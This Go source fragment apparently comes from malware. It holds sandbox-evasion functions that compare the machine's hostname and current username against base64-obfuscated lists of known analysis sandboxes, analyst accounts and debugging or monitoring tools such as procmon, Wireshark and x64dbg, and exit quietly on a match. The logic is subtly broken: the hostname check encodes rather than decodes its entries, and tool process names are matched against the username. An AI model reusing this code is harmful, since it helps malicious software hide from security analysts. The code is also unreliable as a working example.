func NoBlockComputerName() {
  known := []string{
    "REVTS1RPUC1IOVVSQjdU",
    /* "N1NJTFZJQQ==",
    "SEFOU1BFVEVSLVBD",
    "Sk9ITi1QQw==",
    "TVVFTExFUi1QQw==",
    "V0lONy1UUkFQUw==",
    "Rk9SVElORVQ=",
    "VEVRVUlMQUJPT01CT09N",
    "VkJDQ1NDLVBD",
    "REVTS1RPUC1TVk9OWFlE",
    "V0lOLTJIQlhTUktXQ1JZ",
    "V0lOLTJIQlhTUktXQ1JZ",
    "V0lOLUlWRTk5SlRURVE2",
    "V0lOLUhIUU1RRENCVDdF",
    "MENDNDdBQzgzODAz",
    "QU1BWklORy1BVk9DQURP",
    "cmJtaHV3dmNpbmc=",
    "U1RBQ0FTODQ=",
    "U0RKLUZGRDBGRUIwNURD", */
  }

  name, _ := os.Hostname()

  for _, v := range known {
    if base64.URLEncoding.EncodeToString([]byte(v)) == name {
      os.Exit(0)
    }
  }
}

func NoBlockUserProcess() {
  known := []string{
    "QWJieQ==",
    "YXp1cmU=",
    "Z2Vvcmdl",
    /* "YXV0b3J1bnMuZXhl", */
    /* "YXV0b3J1bnNjLmV4ZQ==",
    "ZmlsZW1vbi5leGU=",
    "cHJvY21vbi5leGU=",
    "cmVnbW9uLmV4ZQ==",
    "cHJvY2V4cC5leGU=",
    "aWRhcS5leGU=",
    "aWRhcTY0LmV4ZQ==",
    "SW1tdW5pdHlEZWJ1Z2dlci5leGU=",
    "V2lyZXNoYXJrLmV4ZQ==",
    "ZHVtcGNhcC5leGU=",
    "SG9va0V4cGxvcmVyLmV4ZQ==",
    "SW1wb3J0UkVDLmV4ZQ==",
    "UEVUb29scy5leGU=",
    "TG9yZFBFLmV4ZQ==",
    "U3lzSW5zcGVjdG9yLmV4ZQ==",
    "cHJvY19hbmFseXplci5leGU=",
    "c3lzQW5hbHl6ZXIuZXhl",
    "c25pZmZfaGl0LmV4ZQ==",
    "d2luZGJnLmV4ZQ==",
    "am9lYm94Y29udHJvbC5leGU=",
    "am9lYm94c2VydmVyLmV4ZQ==",
    "am9lYm94c2VydmVyLmV4ZQ==",
    "UmVzb3VyY2VIYWNrZXIuZXhl",
    "eDMyZGJnLmV4ZQ==",
    "eDY0ZGJnLmV4ZQ==",
    "RmlkZGxlci5leGU=",
    "aHR0cGRlYnVnZ2VyLmV4ZQ==", */
  }

  u, _ := user.Current()
  username := u.Username

  for _, v := range known {
    decoded, _ := base64.URLEncoding.DecodeString(v)
    decodedString := string(decoded)
    if strings.EqualFold(decodedString, username) {
      os.Exit(0)
    }
  }
}
